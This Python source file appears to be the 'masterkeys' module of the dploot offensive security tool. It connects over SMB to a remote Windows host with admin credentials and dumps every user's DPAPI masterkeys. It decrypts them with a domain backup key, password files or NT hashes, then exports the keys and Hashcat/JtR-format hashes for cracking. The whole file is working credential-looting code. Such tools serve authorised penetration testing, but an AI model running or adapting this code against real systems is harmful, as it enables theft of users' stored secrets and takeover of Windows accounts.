import argparse
import logging
import sys
from typing import Callable, Dict, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk, handle_outputdir_option, parse_file_as_dict
from dploot.triage.masterkeys import MasterkeysTriage


NAME = "masterkeys"


class MasterkeysAction:
    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options

        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self.outputfile = None
        self.pvkbytes = None
        self.passwords = None
        self.nthashes = None
        self.outputdir = None

        self.outputdir = handle_outputdir_option(directory=self.options.export_dir)

        if self.options.outputfile is not None and self.options.outputfile != "":
            self.outputfile = self.options.outputfile

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(
            self.options, self.target
        )

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info(
            "Connected to {} as {}\\{} {}\n".format(
                self.target.address,
                self.target.domain,
                self.target.username,
                ("(admin)" if self.is_admin else ""),
            )
        )
        if self.is_admin:
            fd = (
                open(self.outputfile + ".mkf", "a+")
                if self.outputfile is not None
                else None
            )

            def masterkey_callback(masterkey):
                if masterkey.key is not None:
                    masterkey.dump()
                    if fd is not None:
                        fd.write(str(masterkey) + "\n")

            triage = MasterkeysTriage(
                target=self.target,
                conn=self.conn,
                pvkbytes=self.pvkbytes,
                nthashes=self.nthashes,
                passwords=self.passwords,
                per_masterkey_callback=masterkey_callback,
            )
            logging.info("Triage ALL USERS masterkeys\n")
            triage.triage_masterkeys()
            if self.outputfile is not None:
                logging.critical("Writting masterkeys to %s" % self.outputfile)
                fd.close()
            if self.options.hashes_outputfile:
                with open(self.options.hashes_outputfile, "a+") as hashes_fd:
                    logging.critical("Writting masterkey hashes to %s" % self.options.hashes_outputfile)
                    for mkhash in [mkhash for masterkey in triage.all_looted_masterkeys for mkhash in masterkey.generate_hash() ]:
                        hashes_fd.write(mkhash + "\n")
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin


def entry(options: argparse.Namespace) -> None:
    a = MasterkeysAction(options)
    a.run()


def parse_masterkeys_options(
    options: argparse.Namespace, target: Target
) -> Tuple[bytes, Dict[str, str], Dict[str, str]]:
    pvkbytes = None
    passwords = {}
    nthashes = {}
    if hasattr(options, "pvk") and options.pvk is not None:
        try:
            pvkbytes = open(options.pvk, "rb").read()
        except Exception as e:
            logging.error(str(e))
            sys.exit(1)

    if hasattr(options, "passwords") and options.passwords is not None:
        try:
            passwords = parse_file_as_dict(options.passwords)
        except Exception as e:
            logging.error(str(e))
            sys.exit(1)

    if hasattr(options, "nthashes") and options.nthashes is not None:
        try:
            nthashes = parse_file_as_dict(options.nthashes)
        except Exception as e:
            logging.error(str(e))
            sys.exit(1)

    if target.password is not None and target.password != "":
        if passwords is None:
            passwords = {}
        passwords[target.username] = target.password

    if target.nthash is not None and target.nthash != "":
        if nthashes is None:
            nthashes = {}
        nthashes[target.username] = target.nthash.lower()

    if nthashes is not None:
        nthashes = {k.lower(): v.lower() for k, v in nthashes.items()}

    if passwords is not None:
        passwords = {k.lower(): v for k, v in passwords.items()}

    return pvkbytes, passwords, nthashes


def add_masterkeys_argument_group(group: argparse._ArgumentGroup) -> None:
    group.add_argument(
        "-pvk",
        action="store",
        help=("Pvk file with domain backup key"),
    )

    group.add_argument(
        "-passwords",
        action="store",
        help=(
            "File containing username:password that will be used eventually to decrypt masterkeys"
        ),
    )

    group.add_argument(
        "-nthashes",
        action="store",
        help=(
            "File containing username:nthash that will be used eventually to decrypt masterkeys"
        ),
    )


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump users masterkey from local or remote target"
    )

    group = subparser.add_argument_group("masterkeys options")

    add_masterkeys_argument_group(group)

    group.add_argument(
        "-outputfile",
        action="store",
        help=("Export keys to file"),
    )

    group.add_argument(
        "-hashes-outputfile",
        action="store",
        help=("Export hashes of masterkeys to file in Hashcat/JtR format"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
